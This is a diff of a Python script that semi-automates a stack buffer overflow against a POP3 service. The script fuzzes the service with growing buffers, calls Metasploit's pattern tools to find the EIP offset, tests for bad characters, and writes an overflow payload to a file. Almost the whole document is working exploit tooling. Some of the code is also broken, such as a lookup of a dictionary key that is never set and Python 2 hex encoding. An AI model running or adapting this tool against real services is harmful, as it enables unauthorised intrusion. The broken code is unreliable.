@@ -6,7 +6,9 @@ import time
 import os
 
 # Global Variables
-_delimiter = f'****************************\n'              # User adjustable vertical process delimiters
+ip = ''                                                     # Target IP
+port = ''                                                   # Target Port
+_delimiter = f'**************************************'      # User adjustable vertical process delimiters
 _current_step = 0                                           # Incremental counter for tracking all steps
 _known_bad_chars = []                                       # Universal storage of chars deemed problematic
 payload = ''                                                # Tracking changes to payload throughout process
@@ -27,6 +29,7 @@ bad_chars = (                                               # Bad character set 
     "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
     "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
     "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+hex_namespace = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
 
 
 def parse_args():
@@ -52,16 +55,16 @@ def get_elapsed_time(_start_time, verbosity):
     return seconds
 
 
-def send_var(_var, ip, port):
+def send_var(_var, _ip, _port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(10.0)                                          # Timeout in seconds (S)
-        s.connect((ip, port))
+        s.connect((_ip, _port))
         s.recv(1024)
-        s.send(b'USER test\r\n')                                    # <REFACTOR> for different syntax/proto
+        s.send(b'USER test\r\n')                                    # <REFACTOR> for different syntax/proto than pop3
         s.recv(1024)
-        s.send(b'PASS {_var}\r\n')                                  # <REFACTOR> for different syntax/proto
-        s.send(b'QUIT\r\n')                                         # <REFACTOR> for different syntax/proto
+        s.send(b'PASS {_var}\r\n')                                  # <REFACTOR> for different syntax/proto than pop3
+        s.send(b'QUIT\r\n')                                         # <REFACTOR> for different syntax/proto than pop3
         s.close()
         result = 'pass'
     except socket.timeout:
@@ -140,28 +143,60 @@ def update_instruction_msg():
     print(msg)
 
 
-def sys_command_used_msg(_sys_command):
+def execute_command(_sys_command):
     print(f'[+] Command Used:\n[+] # user@pwn> {_sys_command}\n')
     var_return = os.popen(_sys_command).read()
     return var_return
 
 
+def interactive_sanitize(_obj, _msg, _type):
+    global _delimiter
+    exit_option = f'[\'q\' to quit]'
+    post_direction = f'Please try again.'
+    while _obj.lower() != 'q':
+        while not(isinstance(_obj, _type)):
+            try:
+                if _type == 'str':
+                    _obj = f'{_obj.lower()}'
+                elif _type == 'int':
+                    _obj = int(_obj)
+            except TypeError as error_message:
+                print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
+                _obj = input(f'{_msg} {exit_option}\n')
+        if _type == 'alnum':
+            while not(_obj.isalnum()):
+                error_message = 'String input must be alphanumeric!. '
+                print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
+                _obj = input(f'{_msg} {exit_option}\n').lower()
+        elif _type == 'hex':
+            hex_passed = 0
+            while hex_passed != 1:
+                try:
+                    int(_obj, 16)
+                    hex_passed = 1
+                except Exception as error_message:
+                    _obj = input(f'{_delimiter}\n{error_message}\n{_delimiter}\n{exit_option}\n{post_direction}\n\n')
+    return _obj
+
+
 def test_ascii_at_offset(_offset):
     output_dict = {}
-    test_chars = input('Please input 4 ASCII Chars for testing offset: ')
-    reg_word_test = f'{test_chars}'
-    while not(reg_word_test.isalnum()):
-        test_chars = input('Please input 4 ASCII Chars for testing offset: ')
-        reg_word_test = f'{test_chars}'
+    msg = 'Please input 4 ASCII Chars for testing offset: '
+    test_chars = input(msg)
+    while len(test_chars) != 4:
+        test_chars = interactive_sanitize(test_chars, msg, 'str')
+    a_buffer = 'A' * _offset
+    b_buffer = f'{test_chars}'
     _buffer = []
     for char in test_chars:
         _buffer.append(char.encode('hex'))
-    a_buffer = 'A' * _offset
+    hex_equiv = b''.join(_buffer)
+    print(f'\nHex Equivalent: {hex_equiv}\n')
     c_buffer = 'C' * 90
-    new_var = f'{a_buffer}{reg_word_test}{c_buffer}'
+    new_var = f'{a_buffer}{b_buffer}{c_buffer}'
     output_dict['new_var'] = new_var
-    output_dict['reg_word_test'] = new_var
     output_dict['a_buffer'] = a_buffer
+    output_dict['b_buffer'] = b_buffer
     output_dict['c_buffer'] = c_buffer
     return output_dict
 
@@ -183,9 +218,6 @@ def esp_region_msg():
 
 def fuzz_test(_ip, _port, _char_length):
     global _delimiter
-    if not(_char_length.isint()):
-        print('The \'char_length\' variable must be type \'int\'!\n')
-        exit(0)
     buffers = ["A"]
     ascii_len = 100
     buffer_max_len = _char_length/100
@@ -218,21 +250,67 @@ def fuzz_test(_ip, _port, _char_length):
     return int(len(current_buffer))
 
 
+def loop_bad_char_test(_payload, _ip, _port):
+    global _delimiter
+    global bad_chars
+    global _known_bad_chars
+    result = send_var(_payload, _ip, _port)
+    print(f'{_delimiter}Payload Result:\n[Expected]:\tfail\n[Actual]:\t{result}\n\n')
+    msg0 = f'[?] Did you identify a bad hex character? (\'y\' for yes, \'n\' for no, \'q\' to quit)\n'
+    msg1 = f'[?] Enter the identified hex character (Ex. Enter \'0a\' for \'0x0a\')\n\'n\' for no\n\'q\' to quit\n'
+    response = input(msg0).lower()
+    if response == 'q':
+        exit(0)
+    elif response == 'n':
+        pass
+    while response != 'y' and response != 'n' and response != 'q':
+        response = input(msg0).lower()
+    while response == 'y':
+        kb_chars = ', '.join(_known_bad_chars)
+        bad_char = input(f'[i] Current KB Hex Characters:\t{kb_chars}\n{msg1}')
+        while len(bad_char) != 2:
+            print(f'Please enter only one hex value at a time (i.e. \'0a\' for \'0x0a\')\n')
+            bad_char = interactive_sanitize(input(msg1), msg1, 'alnum')
+            bad_char = interactive_sanitize(bad_char, msg1, 'hex')
+        bad_char = interactive_sanitize(bad_char, msg1, 'alnum')
+        bad_char = interactive_sanitize(bad_char, msg1, 'hex')
+        bad_char = f'\x{bad_char}'
+        bad_chars.strip(bad_char)
+        if bad_char not in _known_bad_chars:
+            _known_bad_chars.append(bad_char)
+            kb_chars = ', '.join(_known_bad_chars)
+            print(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
+        while bad_char in _known_bad_chars:
+            print(f'Please try again. The \'{bad_char}\' hex string has already been reported.\n')
+            print(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
+        response = input(msg0).lower()
+
+
 def main():
     global _delimiter
     global _current_step
     global _known_bad_chars
+    global hex_namespace
     global bad_chars
     global payload
+    global ip
+    global port
     start_time = time.time()
     args = parse_args()
     ip = args.ip
     port = args.port
     char_length = args.char_length                                              # Defaults to 6000
+    msg = f'The char_length value provided ({char_length}) is not an int. Enter another value for this variable.\n'
+    char_length = interactive_sanitize(char_length, msg, 'int')
 
+    # ****************************************************************************************
+    # Loop through a buffer adding 100 char length to said buffer looking for a crash.
+    # Interact with user to save bad-chars to remove them from future payload build.
+    # Give the user the option to increase the buffer length based on current setting.
+    # ****************************************************************************************
     update_instruction_msg()
-    starting_buffer_length = fuzz_test(ip, port, char_length)
-    msg = f'Testing suggests \'{starting_buffer_length}\' ascii chars, but make sure you have enough to house ' \
+    starting_buffer_length = fuzz_test(ip, port, char_length)       # Looping, Incremental, Interactive Fuzz-Test
+    msg = f'Testing suggests \'{starting_buffer_length}\' ascii buffer len, but make sure you have enough to house ' \
           f'your payload. Also, don\'t worry, you will have another chance to update this length before execution. ' \
           f'Would you like to update the variable length now? (Y/N)\n'
     response = input(msg).lower()
@@ -242,52 +320,66 @@ def main():
         char_length = increase_len_msg(char_length)
     elif response == 'n':
         char_length = starting_buffer_length
+    error_message = 'The variable \'char_length\' must be an integer.'
+    char_length = interactive_sanitize(char_length, error_message, 'int')
 
+    # ****************************************************************************************
+    # Assuming you are this far, the crash and EIP overwrite have been confirmed.
+    # We are now going to send a random pattern so that we can determine the failure offset.
+    # ****************************************************************************************
     update_instruction_msg()
     sys_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {char_length}'
-    print(f'The command used to generate random, non-repeating string is:\n{sys_command}\n')
-    var_return = sys_command_used_msg(sys_command)
+    var_return = execute_command(sys_command)
     send_var(var_return, ip, port)
-    continue_msg()
-
-    update_instruction_msg()
-    eip_reg_value = input('Please input the EIP Register value the program failed on:\n(ex. 08048f9c)\n')
+    msg = 'Please input the EIP Register value the program failed on:\n(ex. 08048f9c)\n'
+    eip_reg_value = input(msg)
+    eip_reg_value = interactive_sanitize(eip_reg_value, msg, 'alnum')
     sys_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l ' \
                   f'{str(char_length)} -q {str(endian_reverse(eip_reg_value))}'
-    offset = sys_command_used_msg(sys_command).split(' ')
+    offset = execute_command(sys_command).split(' ')
     offset = int(offset[len(offset) - 1].strip('\n'))
     initial_summary_msg(offset, eip_reg_value)
     continue_msg()
 
+    # ****************************************************************************************
+    # Interactive user verification/sanity check that the defined offset is correct.
+    # ****************************************************************************************
     update_instruction_msg()
-    new_var = test_ascii_at_offset(offset)['new_var']
-    reg_word_test = test_ascii_at_offset(offset)['reg_word_test']
-    a_buffer = test_ascii_at_offset(offset)['a_buffer']
-    c_buffer = test_ascii_at_offset(offset)['c_buffer']
-    reg_word_test_reverse = endian_reverse(reg_word_test)
+    test_results = test_ascii_at_offset(offset)
+    new_var = test_results['new_var']
+    reg_test_word = test_results['reg_test_word']
+    a_buffer = test_results['a_buffer']
+    c_buffer = test_results['c_buffer']
+    reg_test_word_reverse = endian_reverse(reg_test_word)
     send_var(new_var, ip, port)
-    msg = f'[+] The updated variable now becomes....\nnew_var = (\'A\' * {offset}) +  \"{reg_word_test}\" + ' \
-          f'(\'C\' * 90)\n[CONFIRM HERE] - Your EIP register should read: {reg_word_test_reverse}\nLook ' \
+    msg = f'[+] The updated variable now becomes....\nnew_var = (\'A\' * {offset}) +  \"{reg_test_word}\" + ' \
+          f'(\'C\' * 90)\n[CONFIRM HERE] - Your EIP register should read: {reg_test_word_reverse}\nLook ' \
           f'for a register address that points to the start, or anywhere remotely close to the beginning of ' \
           f'your [A] or [C] buffer zones. This will be a good spot, to most likely place our shellcode.\n\n*** ' \
           f'NOTE Make sure we have roughly 400 bytes between this address\nand the end of your total buffer. (ie. ' \
           f'last address of last [C] buffer component)\n Otherwise, increase the total buffer length."\n\n'
     print(msg)
+    msg = f'[?] Please re-enter or change the suggested offset (Suggested: {offset})\n'
+    new_offset = input(msg)
+    offset = interactive_sanitize(new_offset, msg, 'int')
     continue_msg()
 
+    # ****************************************************************************************
+    # Confirm full length, create payload for bad_chars test and write to file
+    # ****************************************************************************************
     update_instruction_msg()
     new_len = increase_len_msg(char_length)
     while new_len == 'error':
         new_len = increase_len_msg(char_length)
     # POTENTIAL REFACTOR might be needed here if there is a different target than pop3
-    c_updated_buff = ((new_len - len(a_buffer) - len(reg_word_test) - len(bad_chars)) * 'C')
+    c_updated_buff = ((new_len - offset - len(reg_test_word) - len(bad_chars)) * 'C')
     eip_region = esp_region_msg()
     if eip_region == 'before':
-        payload = f'{a_buffer}{reg_word_test}{bad_chars}{c_updated_buff}'
+        payload = f'{a_buffer}{reg_test_word}{bad_chars}{c_updated_buff}'       # This will change.
         # Need to investigate this and understand the steps for C Payload chosen before esp
     elif eip_region == 'at_or_after':
-        payload = f'{a_buffer}{reg_word_test}{bad_chars}{c_updated_buff}'
-    msg = f'[+] Update variable to:\n\tnew_var = (\'A\' * offset) + \"{reg_word_test}\" + bad_chars)\n\t' \
+        payload = f'{a_buffer}{reg_test_word}{bad_chars}{c_updated_buff}'
+    msg = f'[+] Update variable to:\n\tnew_var = (\'A\' * offset) + \"{reg_test_word}\" + bad_chars)\n\t' \
           f'[+] Final buffer written to \"cs.payload\"\n\t***Also, the bad_chars were added to aide ' \
           f'in the next step.\n'
     f_out = open('cs.payload','w')
@@ -295,10 +387,17 @@ def main():
     f_out.close()
     print(msg)
 
+    # ****************************************************************************************
+    # Loop through bad chars test, storing bad_chars for filtering our future payload.
+    # ****************************************************************************************
     # Here, we need to loop through the bad chars test with full interaction with the user and store bad ones
     update_instruction_msg()
+    loop_bad_char_test(payload, ip, port)
     # Use the Reboot or restart service function here in a loop until explicit continue from user.
 
+    # ****************************************************************************************
+    # Find target Register's JMP Call (ex. JMP ESP)
+    # ****************************************************************************************
     update_instruction_msg()
     msg = f'You now must find a good \'jump esp\' command and note the offset that will land us reliably into the ' \
           f'\'C\' part of the previously defined buffer. This should be the ESP buffer and note that we cannot ' \
